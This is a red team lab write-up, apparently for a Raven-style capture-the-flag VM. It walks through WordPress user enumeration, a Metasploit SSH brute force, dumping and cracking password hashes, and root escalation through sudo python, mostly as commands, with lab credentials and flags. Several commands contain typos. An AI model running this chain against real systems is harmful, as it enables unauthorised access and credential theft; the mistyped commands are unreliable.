## Red Team: Summary of Operations

Table of Contents

* Exposed Services
* Critical Vulnerabilities
* Exploitation

Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

$ nmap -sV 192.168.1.110

This scan identifies the services below as potential points of entry:

![nmap](https://user-images.githubusercontent.com/92223941/167322975-5349cecb-c273-4a42-b673-84b126b66bb3.PNG)


* Target 1
	- Port 22/TCP SSH
	- Port 80/TCP http
	- Port 111/TCP rpcblind
	- Port 139/TCP netbios -ssn
	- Port 445/TCP netbios -ssn

The following vulnerabilities were identified on each target:

* Target 1
	- Wordpress enumeration
	- Improper use of SSH
	- Weak user password
	- Misconfigure use of privilege escalation

Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

* Target 1
	- flag1.txt: b9bbcb33e11b80be759c4e844862482d
		- Exploit Used
			- Used wpscan to enumerate the user from the      wordpress website
			- wpscan –url http://192.168.1.110/wordpress -enumerate u
			![flag1a](https://user-images.githubusercontent.com/92223941/167323054-f8c2b10b-e834-45a1-bf7f-1283fe656693.PNG)

			- Used SSH scanner module on Metasploit to brute force login attempts with the username and Michael and wordlists from Kali
			- Msfconsole
			- Use auxiliary/scanner/ssh/ssh_login
			- options
			- set Rhosts 192.168.1.110, 
			- set PASS_File /usr/share/wordlists/rockyou.txt,
			- set USERNAME Michael
			- set VERBOSE true
			- run
			
			![flag1c](https://user-images.githubusercontent.com/92223941/167322697-b6a57985-93ba-4480-87b8-1155fb5ec86e.PNG)
			![flag1d](https://user-images.githubusercontent.com/92223941/167322753-bc60b2cf-8925-423d-aaef-10d562a389a3.PNG)
			![flag1e](https://user-images.githubusercontent.com/92223941/167322783-4532f436-9483-4d4d-9c7b-35467c6147fd.PNG)
			![flag1f](https://user-images.githubusercontent.com/92223941/167322800-4b27040c-e4e8-4bfb-92a7-888fa5753e72.PNG)




			- I then login into Michael via SSH 
			- SSH michael@192.168.1.110 password: michael
			- I then went into the html directory and listed the directories in it
			- cd /var/www/html
			- ls
			- I then went into the service.html file and found flag1.
			- nano service.html
			-  ctrl+w “flag”

	- flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
		- Exploit Used
			- I went back one directory and listed the files and found flag 2
			- cd ..
			- ls
			- cat flag2.txt

	- flag3.txt: afc01ab56b50591e7dccf93122770cd2
		- Exploit Used
			- I went back to the html directory and went into the wordpress directory and listed the directories
			- cd html
			- cd wordpress
			- I then went into the wp-config file and found the password for sql login
			- Nano wp-config.php
			- I logged in via sql
			- mysql -u root -P password: R@v3nSecurity
			- I then viewed the databases then viewed the tables
			- show databases;
			- show tables;
			- I then selected wp_posts and was able to find flag3
			- select * from wp_posts;

	- Flag4.txt: 715dea6c055b9fe3337544932f2941ce
		- Exploit Used
			- While still being logged in via sql I described the table wp_users
			- describe wp_users;
			- I then formatted the username and passwords being separated by a colon sign.
			- select concat_ws(‘:’, user_login, user_pass) from wp_users;
			- I then outputted the formatted table into text file in the www directory and then viewed the file under michael
			- select concat_ws(‘:’, user_login, user_pass) from wp_users into outfile ‘var/www/wp_hashes.txt’;
			- cat wp_hashes.txt
			- I copied wp_hashes.txt file and exited Michael’s computer and pasted the file on www directory on my pc
			- “copied username and passwords”
			- Exit
			- cd /var/www
			- ls
			- touch wp_hashes.txt
			- nano wps_hashes.txt
			- “pasted username and passwords”
			- I ran john the ripper to brute force the password with the usernames and found the password for steven
			- John wp_hashes.txt
			- I logged into Steven via ssh 
			- ssh steven password:pink84
			- I ran a python command to login via root
			- sudo python -c ‘import pty:pty.spawn(“/bin/bash”)’
			- I then went into the root directory I ran the list command and found flag 4 and then I viewed the flag
			- cd /root
			- ls
			- cat flag4.txt
